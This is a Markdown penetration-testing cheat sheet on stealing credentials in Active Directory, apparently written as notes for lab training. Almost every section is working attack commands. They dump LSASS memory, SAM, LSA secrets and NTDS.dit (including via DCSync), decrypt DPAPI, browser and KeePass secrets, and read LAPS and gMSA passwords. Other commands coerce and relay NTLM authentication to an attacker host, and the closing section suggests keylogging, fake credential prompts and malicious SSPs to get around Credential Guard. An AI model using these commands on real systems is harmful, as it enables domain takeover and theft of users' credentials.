# AD - Credential Access

## Table of Contents
- [Hash Cracking Modes Reference](#hash-cracking-modes-reference)
- [LSASS Dumping](#lsass-dumping)
- [SAM, SYSTEM, SECURITY Hives](#sam-system-security-hives)
- [LSA Secrets](#lsa-secrets)
- [Cached Domain Credentials (DCC2)](#cached-domain-credentials-dcc2)
- [NTDS.dit Extraction](#ntdsdit-extraction)
- [DPAPI](#dpapi)
- [LAPS](#laps)
- [gMSA](#gmsa)
- [SYSVOL and GPP cpassword](#sysvol-and-gpp-cpassword)
- [Registry Autologon](#registry-autologon)
- [Unattend and Answer Files](#unattend-and-answer-files)
- [Credential Manager](#credential-manager)
- [KeePass and Browsers](#keepass-and-browsers)
- [NetNTLM Capture and Coercion](#netntlm-capture-and-coercion)
- [Harvesting with Credential Guard enabled](#harvesting-with-credential-guard-enabled)

For collecting the target list and finding where these creds apply see [enumeration.md](enumeration.md). For Kerberos ticket forging (golden/silver/diamond) once you have the krbtgt or a service hash see [kerberos.md](kerberos.md). For tool installation see [tooling.md](tooling.md).

---

## Hash Cracking Modes Reference

Every hash type produced by the techniques below, with exact hashcat `-m` and john `--format`.

| Hash type | hashcat -m | john --format | Notes |
|---|---|---|---|
| NTLM (NT hash) | `1000` | `nt` | 32 hex, from SAM/NTDS/LSASS |
| LM | `3000` | `lm` | legacy, split into 7-char halves |
| NetNTLMv1 | `5500` | `netntlm` | responder/coercion; crack or crack.sh to NT |
| NetNTLMv2 | `5600` | `netntlmv2` | responder/coercion capture |
| Kerberos AS-REP (etype 23) | `18200` | `krb5asrep` | `$krb5asrep$23$...` |
| Kerberos TGS-REP (etype 23, RC4) | `13100` | `krb5tgs` | `$krb5tgs$23$...` kerberoast |
| Kerberos TGS-REP (etype 17, AES128) | `19600` | `krb5tgs` | `$krb5tgs$17$...` |
| Kerberos TGS-REP (etype 18, AES256) | `19700` | `krb5tgs` | `$krb5tgs$18$...` |
| Kerberos AS-REQ Pre-Auth (etype 23) | `7500` | `krb5pa-md5` | from kerbrute/PKINIT downgrade capture |
| Kerberos AS-REQ Pre-Auth (etype 17/18) | `19800`/`19900` | `krb5pa-sha1` | `$krb5pa$17/18$...` AES counterpart of 7500 |
| DCC / MS-Cache v1 | `1100` | `mscash` | pre-Vista, rare |
| DCC2 / MS-Cache v2 | `2100` | `mscash2` | `$DCC2$10240#user#hash` slow |
| DPAPI masterkey v1 | `15300` | `DPAPImk` | `$DPAPImk$1*...` |
| DPAPI masterkey v2 | `15900` | `DPAPImk` | `$DPAPImk$2*...` |
| KeePass | `13400` | `keepass` | from keepass2john |
| NetNTLMv1 (ESS/SSP) | `27000` | - | ESS variant |

```bash
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 kerb.hash rockyou.txt -O -w 3
hashcat -m 18200 asrep.hash rockyou.txt
hashcat -m 5600 netntlmv2.hash rockyou.txt
hashcat -m 2100 dcc2.hash rockyou.txt        # slow, prioritise wordlist quality
john --format=krb5tgs --wordlist=rockyou.txt kerb.hash
john --wordlist=rockyou.txt --rules=best64 ntlm.hash --format=nt
```

NetNTLMv1 with a known challenge (`1122334455667788`) is trivially converted to NT via https://crack.sh — capture it by forcing LM/NTLMv1 downgrade (`responder --lm` or `--disable-ess`).

## LSASS Dumping

Extracts plaintext passwords, NT hashes, and Kerberos tickets of logged-on users from `lsass.exe` memory. Requires local admin / SeDebugPrivilege.

**Defender note (factual):** `mimikatz.exe`, `procdump.exe -ma lsass`, and direct handle opens against LSASS are all signatured by Defender and most EDR. Comsvcs MiniDump and LSASS Protection (RunAsPPL / Credential Guard) change what works. Dumping the file offline avoids on-host AV parsing of credentials.

```cmd
:: comsvcs.dll MiniDump - lives on every Windows host, no upload needed. Needs LSASS PID.
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\l.dmp full
:: PowerShell one-liner for the PID
powershell "rundll32 C:\windows\system32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\Temp\l.dmp full"

:: procdump (Sysinternals, signed - often whitelisted)
procdump.exe -accepteula -ma lsass.exe C:\Temp\l.dmp
procdump.exe -accepteula -ma <PID> C:\Temp\l.dmp

:: Task Manager: right-click lsass > Create dump file (fully GUI, no binary drop)
```

```cmd
:: nanodump - evades userland hooks, can encrypt/corrupt signature
nanodump.exe --write C:\Temp\l.dmp
nanodump.exe -v --fork -w C:\Temp\l.dmp        :: fork LSASS handle, valid dump

:: mimikatz - live
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" "exit"      :: Kerberos AES keys
```

Parse the dump offline on your own box:
```bash
pypykatz lsa minidump l.dmp
pypykatz lsa minidump l.dmp -o out.txt
# mimikatz offline:  sekurlsa::minidump l.dmp  then  sekurlsa::logonpasswords
```

Remote via netexec (uses various methods, `--method` selectable):
```bash
nxc smb srv01 -u administrator -H <NThash> -M lsassy
nxc smb srv01 -u administrator -p 'Pass' -M nanodump
nxc smb srv01 -u administrator -p 'Pass' --lsa                 # LSA secrets (not full LSASS)
lsassy -u administrator -H <NThash> -d corp.local srv01
```

## SAM, SYSTEM, SECURITY Hives

Local account NT hashes (SAM), machine account + LSA (SYSTEM/SECURITY). Local admin required.

```cmd
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
reg save HKLM\SECURITY C:\Temp\security.save
```

```bash
# Offline parse
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

# Remote - dumps SAM+LSA+cached in one shot, uses remote registry / shadow copy
secretsdump.py corp.local/administrator:'Pass'@srv01
secretsdump.py administrator@srv01 -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0'
nxc smb srv01 -u administrator -p 'Pass' --sam --lsa
nxc smb 10.10.10.0/24 -u administrator -H <NThash> --local-auth --sam   # spray local admin, dump SAM
```

The local `Administrator` NT hash from SAM enables pass-the-hash across every host sharing that local password (classic un-LAPSed estate).

## LSA Secrets

Service account passwords (plaintext, `_SC_<service>`), machine account (`$MACHINE.ACC`), auto-logon, DPAPI system keys.

```bash
secretsdump.py corp.local/administrator:'Pass'@srv01           # LSA section printed automatically
nxc smb srv01 -u administrator -p 'Pass' --lsa
reg save HKLM\SECURITY sec.save && reg save HKLM\SYSTEM sys.save   # then secretsdump LOCAL
```

```
mimikatz # lsadump::secrets
```

`$MACHINE.ACC` gives the computer account hash → silver tickets for that host's services, and if it's a DC, effectively domain compromise.

## Cached Domain Credentials (DCC2)

MSCACHEv2 hashes of the last ~10 domain users who logged on interactively. Cannot be pass-the-hash'd — must be cracked (mode `2100`). Useful on a machine offline from the DC.

```bash
secretsdump.py corp.local/administrator:'Pass'@srv01           # CACHED section
nxc smb srv01 -u administrator -p 'Pass' --lsa                 # prints $DCC2$ lines
# Format:  $DCC2$10240#username#hash
hashcat -m 2100 '$DCC2$10240#jsmith#a1b2...' rockyou.txt
```

```
mimikatz # lsadump::cache
```

## NTDS.dit Extraction

The full domain database: every user's NT hash (and LM/history/Kerberos keys). Requires DC admin, or DCSync rights, or file access to a backup.

```bash
# Cleanest: DCSync - no file touch, no service disruption. Needs replication rights.
secretsdump.py corp.local/administrator:'Pass'@dc01 -just-dc
secretsdump.py corp.local/administrator:'Pass'@dc01 -just-dc-ntlm
secretsdump.py corp.local/administrator:'Pass'@dc01 -just-dc-user krbtgt
secretsdump.py -hashes ':<NThash>' corp.local/administrator@dc01 -just-dc
secretsdump.py -k -no-pass corp.local/administrator@dc01.corp.local -just-dc   # Kerberos

# Targeted DCSync of one account
nxc smb dc01 -u administrator -p 'Pass' -M ntdsutil
nxc ldap dc01 -u administrator -p 'Pass' -M dcsync -o USER=krbtgt
```

On the DC itself (creates a snapshot, then parse offline):
```cmd
:: ntdsutil IFM - snapshots NTDS.dit + SYSTEM hive to a folder
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\ifm" quit quit

:: vssadmin shadow copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
vssadmin delete shadows /for=C: /quiet

:: diskshadow scripted alternative
echo set context persistent nowriters > c:\Temp\ds.txt
echo add volume c: alias vss1 >> c:\Temp\ds.txt
echo create >> c:\Temp\ds.txt
echo expose %%vss1%% z: >> c:\Temp\ds.txt
diskshadow /s c:\Temp\ds.txt
```

```bash
# Parse the offline copy
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL -outputfile domain_dump
```

```
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

`-history` adds password history hashes; `-user-status` flags disabled accounts.

## DPAPI

Windows Data Protection API encrypts saved credentials, browser secrets, Wi-Fi keys, RDP passwords, and certificates. Decryption needs the user's masterkey, which unlocks with the user's password/NT hash, or the domain DPAPI backup key (all users) from a DC.

```bash
# --- Impacket suite ---
# User masterkey from password or NT hash
dpapi.py masterkey -file 'C:/Users/jsmith/AppData/Roaming/Microsoft/Protect/S-1-5-.../<guid>' \
  -sid S-1-5-21-...-1103 -password 'Passw0rd!'
dpapi.py masterkey -file <mkfile> -sid <SID> -key <SHA1-of-NT>   # from hash

# Domain backup key (dump once from DC, decrypts everyone's masterkeys forever)
dpapi.py backupkeys -t corp.local/administrator:'Pass'@dc01 --export
dpapi.py masterkey -file <mkfile> -sid <SID> -pvk key.pvk

# Decrypt a credential blob / vault with an unlocked masterkey
dpapi.py credential -file 'C:/Users/jsmith/AppData/Local/Microsoft/Credentials/<blob>' -key '0x<masterkey>'
dpapi.py vault -vpol vpol.vpol -vcrd *.vcrd -key '0x<masterkey>'
```

```bash
# --- DonPAPI: automated remote harvest of ALL DPAPI secrets ---
donpapi collect -t srv01 -u administrator -p 'Pass' -d corp.local
donpapi collect -t targets.txt -u administrator -H <NThash> -d corp.local
donpapi collect -t srv01 -u administrator -p 'Pass' -d corp.local --pvk domain_backupkey.pvk
# Grabs: browser creds/cookies, Credential Manager, vaults, RDP, Wi-Fi, certs. DB at ~/.donpapi
```

```bash
# --- netexec ---
nxc smb srv01 -u administrator -p 'Pass' --dpapi
nxc smb srv01 -u administrator -p 'Pass' --dpapi cookies
```

```
:: --- mimikatz (on-host) ---
mimikatz # dpapi::masterkey /in:"%APPDATA%\Microsoft\Protect\<SID>\<guid>" /rpc
mimikatz # dpapi::cred /in:"%LOCALAPPDATA%\Microsoft\Credentials\<blob>"
mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
mimikatz # vault::cred /patch
mimikatz # vault::list
:: RDP saved creds
mimikatz # dpapi::rdg /in:"<file>.rdg" /unprotect
:: DPAPI-protected certificates + private keys
mimikatz # crypto::certificates /export
mimikatz # sekurlsa::dpapi          :: masterkeys from LSASS memory
```

SharpDPAPI (Windows, offline-friendly):
```
SharpDPAPI.exe triage
SharpDPAPI.exe machinetriage
SharpDPAPI.exe backupkey /server:dc01.corp.local /file:key.pvk
SharpChrome.exe logins /unprotect
```

Masterkey file locations: `%APPDATA%\Microsoft\Protect\<SID>\` (user), `%WINDIR%\System32\Microsoft\Protect\S-1-5-18\` (system). Credential blobs: `%LOCALAPPDATA%\Microsoft\Credentials\` and `%APPDATA%\Microsoft\Credentials\`.

## LAPS

Randomized local admin password per host, stored in AD, readable only by delegated principals.

**Legacy LAPS** — cleartext in `ms-Mcs-AdmPwd`:
```bash
nxc ldap $DC -u jsmith -p 'Pass' -M laps
nxc smb srv01 -u jsmith -p 'Pass' --laps                       # auto-auth using retrieved pw
python3 pyLAPS.py --action get -d corp.local -u jsmith -p 'Pass'
ldapsearch -x -H ldap://$DC -D 'jsmith@corp.local' -w 'Pass' -b 'DC=corp,DC=local' \
  '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd sAMAccountName
bloodyAD -d corp.local -u jsmith -p 'Pass' --host $DC get object 'SRV01$' --attr ms-Mcs-AdmPwd
```

**LAPSv2 (Windows LAPS)** — encrypted in `msLAPS-EncryptedPassword`, decrypted via DPAPI-NG / KDS root key. netexec and certipy-adjacent tooling handle the unwrap:
```bash
nxc ldap $DC -u jsmith -p 'Pass' -M laps                       # handles both legacy + v2
python3 LAPSv2Decrypt.py ...                                   # or use nxc's built-in decrypt
```

```powershell
Get-LapsADPassword -Identity srv01 -AsPlainText                # native, if you have rights
Get-ADComputer srv01 -Properties ms-Mcs-AdmPwd | select -ExpandProperty ms-Mcs-AdmPwd
```

## gMSA

Group Managed Service Accounts — 256-byte random password in `msDS-ManagedPassword`, auto-rotated, readable by principals in `msDS-GroupMSAMembership` (PrincipalsAllowedToRetrieveManagedPassword). You compute the NT hash from the blob.

```bash
python3 gMSADumper.py -u jsmith -p 'Pass' -d corp.local -l $DC
# Prints:  svc_gmsa$:::<NThash>  and the AES keys - directly pass-the-hash-able

nxc ldap $DC -u jsmith -p 'Pass' --gmsa
nxc ldap $DC -u jsmith -p 'Pass' -M gmsa
bloodyAD -d corp.local -u jsmith -p 'Pass' --host $DC get object 'svc_gmsa$' --attr msDS-ManagedPassword
```

```powershell
# On-host, as an allowed principal
$blob = (Get-ADServiceAccount svc_gmsa -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob      # from DSInternals
$mp.SecureCurrentPassword
# DSInternals to compute NT hash from the blob:
ConvertTo-NTHash -Password $mp.SecureCurrentPassword
```

The computed NT hash works for PtH, silver tickets, or S4U if the gMSA has delegation configured.

## SYSVOL and GPP cpassword

Group Policy Preferences stored passwords AES-encrypted with a *Microsoft-published static key* — instantly decryptable. Found in `Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, `DataSources.xml`, `Printers.xml`, `Drives.xml` under SYSVOL.

```bash
nxc smb $DC -u jsmith -p 'Pass' -M gpp_password
nxc smb $DC -u jsmith -p 'Pass' -M gpp_autologin
nxc smb $DC -u jsmith -p 'Pass' --spider SYSVOL --pattern cpassword
Get-GPPPassword.py corp.local/jsmith:'Pass'@$DC
# Manual: find the XML, then decrypt
gpp-decrypt 'j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw'
```

```powershell
Get-GPPPassword                    # PowerSploit
findstr /S /I cpassword \\corp.local\sysvol\corp.local\policies\*.xml
```

## Registry Autologon

Plaintext credentials for automatic logon in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`.

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
```

```bash
nxc smb srv01 -u administrator -p 'Pass' -M reg-winlogon
nxc smb srv01 -u administrator -p 'Pass' --lsa       # DefaultPassword also lands in LSA secrets
```

## Unattend and Answer Files

Deployment leftovers containing local admin / domain-join creds (often base64).

```cmd
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\Sysprep\unattend.xml
type C:\Windows\System32\Sysprep\Panther\unattend.xml
dir /s /b C:\unattend.xml C:\sysprep.inf C:\sysprep.xml
```

```bash
nxc smb srv01 -u jsmith -p 'Pass' -M spider_plus       # will pick up unattend.xml on shares
# base64 password inside <Password><Value>...</Value>
echo 'UABhAHMAcwB3AG8AcgBkADEAIQBQAGEAcwBzAHcAbwByAGQA' | base64 -d | iconv -f UTF-16LE
```

Also check: `web.config`, `*.config`, `C:\inetpub\`, `%PROGRAMDATA%`, PowerShell history:
```cmd
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Credential Manager

```cmd
cmdkey /list                                  :: shows stored targets (not the passwords)
runas /savecred /user:corp\admin cmd.exe      :: reuse a stored cred if present
```

```
mimikatz # vault::cred /patch
mimikatz # vault::list
```
```
SharpDPAPI.exe credentials
SharpDPAPI.exe vaults
```
Decrypt the blobs in `%LOCALAPPDATA%\Microsoft\Credentials\` via the DPAPI section above.

## KeePass and Browsers

```bash
# KeePass database - crack the master password offline
keepass2john Database.kdbx > keepass.hash        # strip the "Database:" filename prefix if john complains
hashcat -m 13400 keepass.hash rockyou.txt
# KeeThief / memory extraction if DB is unlocked in a running process (Windows)
```

```
:: KeePass 2.x CVE-2023-32784 - recover master password from memory dump (all but first char)
python3 keepass_dump.py -f KeePass.DMP
```

Browsers (Chromium: Local State AES key protected by DPAPI, then AES-GCM cookies/logins):
```
SharpChrome.exe logins /unprotect
SharpChrome.exe cookies /unprotect
mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
```
```bash
donpapi collect -t srv01 -u administrator -p 'Pass' -d corp.local   # remote, automated browser triage
firefox_decrypt.py ~/.mozilla/firefox/xxxx.default    # Firefox key4.db + logins.json
```

## NetNTLM Capture and Coercion

Capture and relay NetNTLMv1/v2 by coercing authentication. Full relay chains live in [kerberos.md](kerberos.md) and ADCS notes; capture-to-crack summarized here.

```bash
# Listener
sudo responder -I eth0 -wv
sudo responder -I eth0 --lm --disable-ess       # force NetNTLMv1 downgrade -> crack.sh -> NT
# Captured hashes land in /usr/share/responder/logs/  (mode 5600 / 5500)

# Coerce a target to authenticate to your listener
coercer coerce -u jsmith -p 'Pass' -d corp.local -t srv01 -l <attacker-ip>
petitpotam.py -u jsmith -p 'Pass' -d corp.local <attacker-ip> <dc-ip>
petitpotam.py <attacker-ip> <dc-ip>              # unauthenticated on unpatched (MS-EFSR)
printerbug.py corp.local/jsmith:'Pass'@srv01 <attacker-ip>     # MS-RPRN spooler
dfscoerce.py -u jsmith -p 'Pass' -d corp.local <attacker-ip> <dc-ip>
Coercer.py coerce -l <attacker-ip> -t <dc-ip> -u jsmith -p 'Pass' -d corp.local

# Relay instead of capture (SMB signing must be off on the target)
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldap://dc01 --escalate-user jsmith          # RBCD / privilege escalation
ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController   # ESC8
```

Convert a NetNTLMv1 capture: submit the `user::domain:LMresp:NTresp:challenge` line to crack.sh (needs challenge `1122334455667788`, set in Responder.conf), which returns the NT hash directly — no wordlist needed.

## Harvesting with Credential Guard enabled

CRTE labs enable **LSASS Credential Guard** (VBS/isolated LSA). It walls off derived secrets so `sekurlsa::logonpasswords` returns no plaintext and NTLM hashes / TGT session keys are no longer extractable from LSASS — Pass-the-Hash from a dump dies. It does **not** protect everything; adapt rather than give up.

What still works:
- **Kerberos tickets, not hashes.** Cred Guard protects the raw keys, but usable **TGTs still live in the ticket cache**. Extract with `Rubeus.exe dump /nowrap` / `triage`, or use `tgtdeleg` (`Rubeus.exe tgtdeleg /nowrap`) to coax the SSPI to hand you a usable delegation TGT for the current user without touching LSA-protected memory. Then Pass-the-Ticket (see [lateral-movement](lateral-movement.md)) instead of PtH.
- **Pivot with tickets, not hashes.** With a TGT/TGS in hand, authenticate everywhere via Kerberos (`-k` / PtT). Cred Guard doesn't block ticket *use*.
- **DCC2 / cached logon secrets** are stored in the SECURITY hive, **not** in Cred-Guard-isolated LSA — dump offline (see [Cached Domain Credentials (DCC2)](#cached-domain-credentials-dcc2)) and crack (`-m 2100`). Same for **LSA secrets** / `$MACHINE.ACC` (see [LSA Secrets](#lsa-secrets)).
- **DPAPI-protected secrets** (browser logins/cookies, Credential Manager, vaults, RDP, saved certs) are unaffected — Cred Guard doesn't touch DPAPI. See [DPAPI](#dpapi) / DonPAPI / SharpDPAPI.
- **On-disk / registry creds**: SAM local hashes, GPP cpassword, unattend/answer files, autologon registry, PowerShell history, config files (see the sections above) — none rely on LSASS.
- **Capture at authentication time** (the credential never enters protected LSA as plaintext you can read, so intercept it as the user types/uses it): keylogging, clipboard scraping, RDP/credential-prompt phishing (fake `CredUIPromptForCredentials`), and **SSPI/security-package hooking** — e.g. a malicious/logging SSP capturing plaintext at logon (see Custom SSP in [domain-dominance](domain-dominance.md)).
- **Kerberoast / AS-REP roast** are entirely network-side and independent of Cred Guard.

Confirm Cred Guard state first: `Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | select SecurityServicesRunning` (value `1` in the array = Credential Guard running), or `Get-ComputerInfo | select *DeviceGuard*`.
